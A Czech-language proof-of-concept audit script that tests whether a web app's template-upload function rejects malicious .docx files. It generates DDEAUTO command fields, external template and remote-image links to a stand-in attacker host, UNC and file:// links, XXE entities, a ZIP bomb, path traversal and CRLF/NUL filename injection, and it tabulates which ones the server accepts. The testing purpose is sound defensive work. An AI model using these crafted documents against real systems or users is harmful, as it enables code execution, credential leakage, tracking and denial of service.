/* PoC čočky DO (audit 20. 11. 2026): co pustí SERVER při zveřejnění šablony.
 * Lokálně, paměťové úložiště, bez sítě. Spuštění: node podklady/audit_2026-11-20/poc_DO_sablona_server.mjs */
process.env.TAJEMSTVI_RELACE = 'testovaci-tajemstvi-jen-pro-lokalni-beh';
process.env.ADMIN_INIT_HESLO = 'Docasne.Heslo.123';
process.env.ADMIN_EMAIL = 'spravce@priklad.cz';
const pamet = new Map();
globalThis.__TEST_ULOZISTE = (nazev) => ({
  async cti(k) { return pamet.has(nazev + '/' + k) ? JSON.parse(pamet.get(nazev + '/' + k)) : null; },
  async zapis(k, v) { pamet.set(nazev + '/' + k, JSON.stringify(v)); },
  async seznam(prefix) { return [...pamet.keys()].filter(x => x.startsWith(nazev + '/' + (prefix || ''))).map(x => x.slice(nazev.length + 1)); },
  async smaz(k) { pamet.delete(nazev + '/' + k); },
});
const { default: prihlaseni } = await import('../../netlify/functions/prihlaseni.mjs');
const { default: sablony } = await import('../../netlify/functions/sablony.mjs');
const { default: uzivatele } = await import('../../netlify/functions/uzivatele.mjs');
const { createRequire } = await import('node:module');
const require = createRequire(import.meta.url);
const DG = require('../../src/docxgen.js');
const zlib = require('node:zlib');

const post = (fn, url, telo, cookie) => fn(new Request(url, { method: 'POST', headers: cookie ? { cookie } : {}, body: JSON.stringify(telo) }));
const login = async (e, h) => ((await post(prihlaseni, 'http://x/api/prihlaseni', { email: e, heslo: h })).headers.get('set-cookie') || '').split(';')[0];
const api = async (telo, c) => { const r = await post(sablony, 'http://x/api/sablony', telo, c); return { st: r.status, ...(await r.json()) }; };
const cA = await login('spravce@priklad.cz', 'Docasne.Heslo.123');
await post(uzivatele, 'http://x/api/uzivatele', { akce: 'zaloz', email: 'obch@priklad.cz', jmeno: 'Obch', role: 'Obchodník', heslo: 'Heslo12345x' }, cA);
const cO = await login('obch@priklad.cz', 'Heslo12345x');

const enc = new TextEncoder();
const W = 'xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main"';
const CT = '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/><Default Extension="xml" ContentType="application/xml"/><Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>';
const RELS = '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/></Relationships>';
const REL = 'http://schemas.openxmlformats.org/officeDocument/2006/relationships/';
let n = 0;
/* o = { telo, drels, navic:[{nazev,data}], ct } → base64 .docx */
async function docx(o) {
  o = o || {}; n++;
  const doc = `<?xml version="1.0"?><w:document ${W}><w:body><w:p><w:r><w:t>Šablona ${n} {{FIRMA_NAZEV}}</w:t></w:r></w:p>${o.telo || ''}</w:body></w:document>`;
  const p = [
    { nazev: '[Content_Types].xml', data: enc.encode(o.ct || CT) },
    { nazev: '_rels/.rels', data: enc.encode(RELS) },
    { nazev: 'word/document.xml', data: enc.encode(o.doc || doc) },
  ];
  if (o.drels) p.push({ nazev: 'word/_rels/document.xml.rels', data: enc.encode(`<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">${o.drels}</Relationships>`) });
  (o.navic || []).forEach(x => p.push({ nazev: x.nazev, data: typeof x.data === 'string' ? enc.encode(x.data) : x.data }));
  return Buffer.from(await DG.zipZapis(p).arrayBuffer());
}
const b64 = async (o) => (await docx(o)).toString('base64');
const pole = (kod) => `<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText xml:space="preserve">${kod}</w:instrText></w:r><w:r><w:fldChar w:fldCharType="separate"/></w:r><w:r><w:t>x</w:t></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>`;

/* ZIP s jednou deflate položkou zadané velikosti (bomba) — ručně, zipZapis umí jen STORE. */
function zipDeflate(polozky) {
  const casti = [], cd = []; let off = 0;
  const u16 = v => Buffer.from([v & 255, (v >> 8) & 255]); const u32 = v => { const b = Buffer.alloc(4); b.writeUInt32LE(v >>> 0); return b; };
  for (const p of polozky) {
    const jm = Buffer.from(p.nazev), komp = zlib.deflateRawSync(p.data, { level: 9 }), crc = DG.crc32 ? DG.crc32(p.data) : 0;
    const hl = Buffer.concat([u32(0x04034b50), u16(20), u16(0x0800), u16(8), u16(0), u16(0), u32(crc), u32(komp.length), u32(p.data.length), u16(jm.length), u16(0), jm]);
    cd.push(Buffer.concat([u32(0x02014b50), u16(20), u16(20), u16(0x0800), u16(8), u16(0), u16(0), u32(crc), u32(komp.length), u32(p.data.length), u16(jm.length), u16(0), u16(0), u16(0), u16(0), u32(0), u32(off), jm]));
    casti.push(hl, komp); off += hl.length + komp.length;
  }
  const cdb = Buffer.concat(cd);
  return Buffer.concat([...casti, cdb, u32(0x06054b50), u16(0), u16(0), u16(cd.length), u16(cd.length), u32(cdb.length), u32(off), u16(0)]);
}

const vysledky = [];
async function zkus(id, popis, cekam, data, cookie, typ) {
  const t0 = Date.now();
  const r = await api({ akce: 'zverejnit', typ: typ || 'nabidka', nazev: id + '.docx', data }, cookie || cA);
  const prijato = !!r.ok;
  vysledky.push({ id, popis, cekam, prijato, st: r.st, ms: Date.now() - t0, chyba: String(r.chyba || '').slice(0, 110) });
}

/* --- kdo smí --- */
await zkus('A1', 'obchodník zveřejňuje čistou šablonu', 'odmítnout', await b64(), cO);
{ const r = await sablony(new Request('http://x/api/sablony', { method: 'POST', body: JSON.stringify({ akce: 'zverejnit', typ: 'nabidka', nazev: 'a.docx', data: await b64() }) }));
  vysledky.push({ id: 'A2', popis: 'nepřihlášený zveřejňuje', cekam: 'odmítnout', prijato: r.status === 200, st: r.status, ms: 0, chyba: '' }); }
{ const r = await sablony(new Request('http://x/api/sablony?typ=nabidka'));
  vysledky.push({ id: 'A3', popis: 'nepřihlášený čte šablonu (GET)', cekam: 'odmítnout', prijato: r.status === 200, st: r.status, ms: 0, chyba: '' }); }

/* --- klasické vektory (mají být odmítnuty) --- */
await zkus('B1', 'attachedTemplate na vnější adresu', 'odmítnout', await b64({ navic: [{ nazev: 'word/_rels/settings.xml.rels', data: `<Relationships><Relationship Id="rId1" Type="${REL}attachedTemplate" Target="https://utocnik.priklad.cz/t.dotm" TargetMode="External"/></Relationships>` }] }));
await zkus('B2', 'vzdálený obrázek (image, External)', 'odmítnout', await b64({ drels: `<Relationship Id="rId9" Type="${REL}image" Target="https://utocnik.priklad.cz/p.png" TargetMode="External"/>` }));
await zkus('B3', 'vbaProject.bin', 'odmítnout', await b64({ navic: [{ nazev: 'word/vbaProject.bin', data: new Uint8Array([1, 2, 3]) }] }));
await zkus('B4', '.docm přejmenovaný (macroEnabled v Content_Types)', 'odmítnout', await b64({ ct: CT.replace('wordprocessingml.document.main+xml', 'ms-word.document.macroEnabled.main+xml').replace('application/vnd.openxmlformats-officedocument.', 'application/vnd.') }));
await zkus('B5', 'DOCTYPE + ENTITY (XXE / billion laughs)', 'odmítnout', await b64({ doc: `<?xml version="1.0"?><!DOCTYPE d [<!ENTITY a "aaaa"><!ENTITY b "&a;&a;&a;&a;">]><w:document ${W}><w:body><w:p><w:r><w:t>&b; {{FIRMA_NAZEV}}</w:t></w:r></w:p></w:body></w:document>` }));
await zkus('B6', 'pole INCLUDETEXT', 'odmítnout', await b64({ telo: pole(' INCLUDETEXT "\\\\\\\\server\\\\x.docx" ') }));
await zkus('B7', 'pole DDEAUTO', 'odmítnout', await b64({ telo: pole(' DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe "/k calc" ') }));
await zkus('B8', 'altChunk', 'odmítnout', await b64({ telo: '<w:altChunk r:id="rId5"/>', drels: `<Relationship Id="rId5" Type="${REL}aFChunk" Target="x.html"/>` }));
await zkus('B9', 'oleObject (embeddings)', 'odmítnout', await b64({ navic: [{ nazev: 'word/embeddings/oleObject1.bin', data: new Uint8Array([1]) }] }));
await zkus('B10', 'hypertextový odkaz file://', 'odmítnout', await b64({ drels: `<Relationship Id="rId5" Type="${REL}hyperlink" Target="file:///c:/windows/system32/calc.exe" TargetMode="External"/>` }));
await zkus('B11', 'ZIP bomba (1 položka, 80 MB nul → ~80 kB)', 'odmítnout', zipDeflate([{ nazev: '[Content_Types].xml', data: Buffer.from(CT) }, { nazev: 'word/document.xml', data: Buffer.alloc(80 * 1024 * 1024, 0x20) }]).toString('base64'));
await zkus('B12', 'poškozený adresář ZIP (useknutý soubor)', 'odmítnout', (await docx()).subarray(0, 300).toString('base64'));
await zkus('B13', 'připojený druhý archiv za prvním (2× EOCD)', 'odmítnout', Buffer.concat([await docx(), await docx({ telo: pole(' DDEAUTO x ') })]).toString('base64'));

/* --- kandidáti na mezeru (zjišťuje se, co server pustí) --- */
await zkus('C1', 'odkaz External s RELATIVNÍM cílem na spustitelný soubor (..\\..\\x.hta)', 'odmítnout?', await b64({ telo: '<w:p><w:hyperlink r:id="rId5"><w:r><w:t>klik</w:t></w:r></w:hyperlink></w:p>', drels: `<Relationship Id="rId5" Type="${REL}hyperlink" Target="..\\..\\Downloads\\faktura.hta" TargetMode="External"/>` }));
await zkus('C2', 'vztah typu hyperlink (https) použitý jako ODKAZOVANÝ OBRÁZEK (a:blip r:link)', 'odmítnout?', await b64({ telo: '<w:p><w:r><w:drawing><a:graphic><a:graphicData><a:blip r:link="rId5"/></a:graphicData></a:graphic></w:drawing></w:r></w:p>', drels: `<Relationship Id="rId5" Type="${REL}hyperlink" Target="https://utocnik.priklad.cz/sledovac.png" TargetMode="External"/>` }));
await zkus('C3', 'pole HYPERLINK na síťovou cestu \\\\server (bez vztahu)', 'odmítnout?', await b64({ telo: pole(' HYPERLINK "\\\\\\\\utocnik.priklad.cz\\\\sdileni\\\\a.docx" ') }));
await zkus('C4', 'symbol {{…}} uvnitř kódu pole (HYPERLINK "{{OBJEDNATEL_WEB}}")', 'odmítnout?', await b64({ telo: pole(' HYPERLINK "{{OBJEDNATEL_WEB}}" ') }));
await zkus('C5', 'položky ZIP s cestou ../ a absolutní cestou', 'odmítnout?', await b64({ navic: [{ nazev: '../../mimo.xml', data: '<a/>' }, { nazev: '/etc/x.xml', data: '<a/>' }, { nazev: 'word\\document.xml', data: '<a/>' }] }));
await zkus('C6', 'duplicitní word/document.xml (dvě položky téhož jména)', 'odmítnout?', await b64({ navic: [{ nazev: 'word/document.xml', data: `<w:document ${W}><w:body><w:p><w:r><w:t>JINÝ OBSAH</w:t></w:r></w:p></w:body></w:document>` }] }));
await zkus('C7', 'pole FILENAME \\p / USERNAME (únik cesty a jména při aktualizaci polí)', 'odmítnout?', await b64({ telo: pole(' FILENAME \\\\p ') + pole(' USERNAME ') }));
{ /* base64 s vycpávkou uprostřed: Node čte jen část před „=", prohlížeč (atob) spadne */
  const cisty = await b64();
  await zkus('C8', 'base64 s „=" uprostřed + smetí (server čte jen začátek, atob v prohlížeči spadne)', 'odmítnout?', cisty.replace(/=*$/, '') + '=' + '!!!smeti!!!'); }
{ const r = await api({ akce: 'zverejnit', typ: 'nabidka', nazev: 'N'.repeat(200000) + '.docx', poznamka: 'P'.repeat(500000), data: await b64() }, cA);
  vysledky.push({ id: 'C9', popis: 'název 200 kB a poznámka 500 kB (jdou do rejstříku, který čte každý přihlášený)', cekam: 'odmítnout?', prijato: !!r.ok, st: r.st, ms: 0, chyba: String(r.chyba || '').slice(0, 80) }); }
{ const r = await api({ akce: 'zverejnit', typ: 'nabidka', nazev: '..\\..\\x\r\nContent-Type: text/html\u0000.docx', data: await b64() }, cA);
  vysledky.push({ id: 'C10', popis: 'název souboru s ../, CRLF a NUL', cekam: 'odmítnout?', prijato: !!r.ok, st: r.st, ms: 0, chyba: String(r.chyba || '').slice(0, 80) }); }
{ /* mnoho položek: 60 000 prázdných XML */
  const navic = []; for (let i = 0; i < 60000; i++) navic.push({ nazev: 'x/' + i + '.xml', data: '<a/>' });
  await zkus('C11', '60 000 položek v ZIPu (~3,6 MB)', 'odmítnout?', await b64({ navic })); }
{ /* 60 MB rozbalených (pod stropem 64 MB) — čas kontroly na serveru */
  await zkus('C12', 'jedna XML část 60 MB po rozbalení (pod stropem 64 MB)', 'odmítnout?', zipDeflate([{ nazev: '[Content_Types].xml', data: Buffer.from(CT) }, { nazev: '_rels/.rels', data: Buffer.from(RELS) }, { nazev: 'word/document.xml', data: Buffer.concat([Buffer.from(`<w:document ${W}><w:body><w:p><w:r><w:t>{{FIRMA_NAZEV}}`), Buffer.alloc(60 * 1024 * 1024, 0x20), Buffer.from('</w:t></w:r></w:p></w:body></w:document>')]) }]).toString('base64')); }

console.log('ID   | čekám      | server      | ms    | popis');
for (const v of vysledky) console.log(v.id.padEnd(4), '|', v.cekam.padEnd(10), '|', (v.prijato ? 'PŘIJATO ' : 'odmítnuto') .padEnd(11), '|', String(v.ms).padStart(5), '|', v.popis, v.prijato ? '' : '→ ' + v.st + ' ' + v.chyba);
const zleB = vysledky.filter(v => /^[AB]/.test(v.id) && v.prijato);
const mezery = vysledky.filter(v => /^C/.test(v.id) && v.prijato);
console.log('\nKlasické vektory a práva (A, B): ' + (zleB.length ? 'ZRANITELNÉ — ' + zleB.map(v => v.id).join(', ') : 'ODOLNÉ (vše odmítnuto)'));
console.log('Kandidáti (C) přijatí serverem: ' + (mezery.length ? mezery.map(v => v.id).join(', ') + ' → ZRANITELNÉ (v rozsahu popsaném ve zprávě; zveřejňuje jen administrátor)' : 'žádný → ODOLNÉ'));
